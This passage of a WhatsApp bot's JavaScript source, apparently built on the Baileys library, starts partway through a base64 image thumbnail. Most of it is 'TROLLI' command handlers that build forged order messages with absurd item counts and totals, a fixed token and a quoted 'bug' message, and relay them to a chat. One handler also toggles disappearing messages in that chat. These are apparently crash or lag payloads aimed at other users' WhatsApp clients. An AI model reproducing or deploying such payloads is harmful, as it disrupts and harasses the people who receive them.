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",
                                          "itemCount": 1000000000000,
                                          "status": "INQUIRY",
                                          "surface": "CATALOG",
                                          "orderTitle": "GUA GK NGERTI",
                                          "message": "entah lah gua nob",
                                          "sellerJid": "6288224859350@s.whatsapp.net",
                                          "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
                                          "totalAmount1000": "99999999999999999999",
                                          "totalCurrencyCode": "IDR",
                                          "contextInfo": {
                                                 "forwardingScore": 3,
                                                 "isForwarded": true
                                          }
                                   }
                            }, {
                                   quoted: bugtrol,
                                   contextInfo: {}
                            })

                            dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
                            dha.relayWAMessage(res)
                            break
                     case 'p': // TROLLI
                            buf = Mfake
                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
                            imeg = imeu.message.imageMessage
                            res = await dha.prepareMessageFromContent(from, {
                                   "orderMessage": {
                                          "orderId": "150453297177375",
                                          "thumbnail": "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",
                                          "itemCount": 2021,
                                          "status": "INQUIRY",
                                          "surface": "CATALOG",
                                          "orderTitle": "LOL",
                                          "message": "Hallo Kak",
                                          "sellerJid": "6288224859350@s.whatsapp.net",
                                          "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
                                          "totalAmount1000": "99999999999999999999",
                                          "totalCurrencyCode": "IDR",
                                          "contextInfo": {
                                                 "forwardingScore": 3,
                                                 "isForwarded": true
                                          }
                                   }
                            }, {
                                   quoted: imeu,
                                   contextInfo: {}
                            })

                            dha.relayWAMessage(res)
                            break
                            //------------------<HEWAN MENU>---------------

                            //------------------< Ingfo Bot >-------------------
                     case 'runtime':
                            textImg(`${runtime(process.uptime())}`)
                            break
                     case 'youtube':
                            reply(`Jangan Lupa Subscribe YT Owner:\n https://youtu.be/Wgi3uOGlmYs`)
                            break
                     case 'masukandata':
